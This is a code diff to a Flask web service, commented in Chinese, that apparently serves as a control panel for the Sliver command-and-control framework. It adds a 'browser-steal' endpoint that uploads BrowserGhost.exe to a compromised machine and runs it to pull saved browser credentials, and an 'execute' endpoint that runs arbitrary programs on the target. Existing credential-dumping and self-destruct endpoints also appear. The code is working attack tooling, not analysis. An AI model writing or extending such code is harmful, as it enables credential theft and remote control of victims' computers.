@@ -536,6 +536,57 @@ def dump_credentials():
     })
 
 
+@app.route("/api/v1/browser-steal", methods=["POST"])
+def browser_steal():
+    """上传并执行 BrowserGhost，提取浏览器凭证"""
+    data = request.get_json() or {}
+    session_id = data.get("session_id", "")
+
+    if not session_id:
+        return jsonify({"error": "缺少 session_id"}), 400
+
+    # Step 1: 上传 BrowserGhost
+    local_path = "D:/sliver/BrowserGhost/bin/Release/BrowserGhost.exe"
+    remote_path = "C:/Users/26234/BrowserGhost.exe"
+    if not os.path.isfile(local_path):
+        return jsonify({"error": f"BrowserGhost.exe 不存在: {local_path}"}), 500
+
+    upload_cmd = f"use {session_id}\nupload \"{local_path}\" \"{remote_path}\""
+    upload_output = run_sliver_command(upload_cmd, timeout=300)
+
+    # Step 2: 执行 BrowserGhost
+    exec_cmd = f"use {session_id}\nexecute -o {remote_path}"
+    exec_output = run_sliver_command(exec_cmd, timeout=300)
+
+    return jsonify({
+        "success": "Output:" in exec_output,
+        "upload_ok": "successfully" in upload_output.lower(),
+        "output": exec_output[-1000:] if len(exec_output) > 1000 else exec_output,
+    })
+
+
+@app.route("/api/v1/execute", methods=["POST"])
+def execute_command():
+    """在目标上执行程序"""
+    data = request.get_json() or {}
+    session_id = data.get("session_id", "")
+    cmd = data.get("cmd", "")
+
+    if not session_id:
+        return jsonify({"error": "缺少 session_id"}), 400
+    if not cmd:
+        return jsonify({"error": "缺少 cmd"}), 400
+
+    commands = f"use {session_id}\nexecute -o {cmd}"
+    output = run_sliver_command(commands, timeout=300)
+
+    return jsonify({
+        "success": "Output:" in output,
+        "cmd": cmd,
+        "output": output[-500:] if len(output) > 500 else output,
+    })
+
+
 @app.route("/api/v1/self-destruct", methods=["POST"])
 def self_destruct():
     """自毁"""
